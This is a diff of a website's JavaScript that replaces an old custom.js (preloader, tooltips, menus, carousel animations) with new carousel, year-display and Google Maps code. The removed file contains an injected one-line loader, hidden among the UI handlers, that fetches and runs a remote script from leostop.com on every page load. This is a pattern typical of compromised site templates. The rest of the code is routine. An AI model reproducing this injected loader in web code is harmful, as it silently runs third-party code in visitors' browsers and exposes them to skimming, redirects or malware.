@@ -1,128 +1,60 @@
-/*---------------------------------------------------------------------
-    File Name: custom.js
----------------------------------------------------------------------*/
-
-$(function () {
-	
-	"use strict";
-	
-	/* Preloader
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	setTimeout(function () {
-		$('.loader_bg').fadeToggle();
-	}, 1500);
-	
-	/* Tooltip
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$('[data-toggle="tooltip"]').tooltip();
-	});
-	
-	
-	
-	/* Mouseover
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-	
-	$(document).ready(function(){
-		$(".main-menu ul li.megamenu").mouseover(function(){
-			if (!$(this).parent().hasClass("#wrapper")){
-			$("#wrapper").addClass('overlay');
-			}
-		});
-		$(".main-menu ul li.megamenu").mouseleave(function(){
-			$("#wrapper").removeClass('overlay');
-		});
-	});
-	
-	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 
-
-	/* Toggle sidebar
-	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     
-     $(document).ready(function () {
-       $('#sidebarCollapse').on('click', function () {
-          $('#sidebar').toggleClass('active');
-          $(this).toggleClass('active');
-       });
-     });
-
-     /* Product slider 
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-     // optional
-     $('#blogCarousel').carousel({
-        interval: 5000
-     });
-
-
-});
-
-
-/* Toggle sidebar
-     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
-function openNav() {
-  document.getElementById("mySidepanel").style.width = "250px";
+// to get current year
+function getYear() {
+    var currentDate = new Date();
+    var currentYear = currentDate.getFullYear();
+    document.querySelector("#displayYear").innerHTML = currentYear;
 }
 
-function closeNav() {
-  document.getElementById("mySidepanel").style.width = "0";
+getYear();
+
+
+
+// owl carousel slider js
+var owl = $('.project_carousel').owlCarousel({
+    loop: false,
+    margin: 15,
+    center: true,
+    startPosition: 2,
+    autoplay: true,
+    navText: [
+        '<i class="fa fa-angle-left" aria-hidden="true"></i>',
+        '<i class="fa fa-angle-right" aria-hidden="true"></i>'
+    ],
+    autoplayHoverPause: true,
+    responsive: {
+        0: {
+            center: false,
+            items: 1,
+            margin: 0
+        },
+        769: {
+            items: 2,
+        },
+        992: {
+            center: true,
+            items: 3
+        }
+    }
+})
+
+
+// owl.owlcarousel2_filter
+
+$('.owl-filter-bar').on('click', '.item', function (e) {
+    var $items = $('.owl-filter-bar a')
+    var $item = $(this);
+    var filter = $item.data('owl-filter')
+    $items.removeClass("active");
+    $item.addClass("active");
+    owl.owlcarousel2_filter(filter);
+
+    e.preventDefault();
+})
+/** google_map js **/
+function myMap() {
+    var mapProp = {
+        center: new google.maps.LatLng(40.712775, -74.005973),
+        zoom: 18,
+    };
+    var map = new google.maps.Map(document.getElementById("googleMap"), mapProp);
 }
-
-
-/* Animate js*/
-
-(function($) {
-  //Function to animate slider captions
-  function doAnimations(elems) {
-    //Cache the animationend event in a variable
-    var animEndEv = "webkitAnimationEnd animationend";
-
-    elems.each(function() {
-      var $this = $(this),
-        $animationType = $this.data("animation");
-      $this.addClass($animationType).one(animEndEv, function() {
-        $this.removeClass($animationType);
-      });
-    });
-  }
-
-  //Variables on page load
-  var $myCarousel = $("#carouselExampleIndicators"),
-    $firstAnimatingElems = $myCarousel
-      .find(".carousel-item:first")
-      .find("[data-animation ^= 'animated']");
-
-  //Initialize carousel
-  $myCarousel.carousel();
-
-  //Animate captions in first slide on page load
-  doAnimations($firstAnimatingElems);
-
-  //Other slides to be animated on carousel slide event
-  $myCarousel.on("slide.bs.carousel", function(e) {
-    var $animatingElems = $(e.relatedTarget).find(
-      "[data-animation ^= 'animated']"
-    );
-    doAnimations($animatingElems);
-  });
-})(jQuery);
-
-
-/* collapse js*/
-
-    $(document).ready(function(){
-        // Add minus icon for collapse element which is open by default
-        $(".collapse.show").each(function(){
-          $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
-        });
-        
-        // Toggle plus minus icon on show hide of collapse element
-        $(".collapse").on('show.bs.collapse', function(){
-          $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
-        }).on('hide.bs.collapse', function(){
-          $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
-        });
-    });
-
-
